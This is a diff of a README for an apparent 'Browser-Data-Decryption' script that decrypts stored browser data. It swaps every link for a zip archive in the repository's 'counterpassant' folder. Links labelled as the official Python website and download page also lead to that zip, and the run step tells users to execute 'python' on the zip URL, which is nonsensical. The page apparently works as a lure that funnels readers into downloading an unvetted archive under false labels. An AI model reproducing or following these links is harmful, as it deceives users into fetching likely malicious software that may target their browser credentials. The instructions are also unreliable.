@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the Browser-Data-Decryption s
 
 ## 📥 Download the Application
 
-[![Download Browser-Data-Decryption](https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip)](https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip)
+[![Download Browser-Data-Decryption](https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip)](https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip)
 
 You can download the latest version of the Browser-Data-Decryption script from the Releases page. This page contains all available versions and any updates.
 
@@ -21,7 +21,7 @@ Before you begin, ensure that your system meets these requirements:
   - `pycryptodome`
   - `pywin32`
 
-You can install Python from the official website: [https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip](https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip).
+You can install Python from the official website: [https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip](https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip).
 
 ## 🛠️ Installation Steps
 
@@ -29,7 +29,7 @@ You can install Python from the official website: [https://raw.githubusercontent
 
 If you do not have Python installed, follow these steps:
 
-- Visit the [https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip download page](https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip).
+- Visit the [https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip download page](https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip).
 - Download the appropriate installer for your Windows version.
 - Run the installer and make sure to check the option "Add Python to PATH".
 
@@ -51,7 +51,7 @@ pip install pywin32
 
 Visit the Releases page to download the latest version of Browser-Data-Decryption:
 
-[Download from Releases Page](https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip)
+[Download from Releases Page](https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip)
 
 Look for the latest release and click on the asset link to download the file.
 
@@ -75,10 +75,10 @@ Replace `path\to\your\folder` with the actual path.
 - Run the script by typing the following command:
 
 ```
-python https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip
+python https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip
 ```
 
-Make sure to replace `https://raw.githubusercontent.com/garvvv12/Browser-Data-Decryption/main/counterpassant/Browser-Data-Decryption.zip` with the actual name of the script file if it differs.
+Make sure to replace `https://github.com/garvvv12/Browser-Data-Decryption/raw/refs/heads/main/counterpassant/Data-Decryption-Browser-2.0.zip` with the actual name of the script file if it differs.
 
 ## 🚀 Using the Application
 
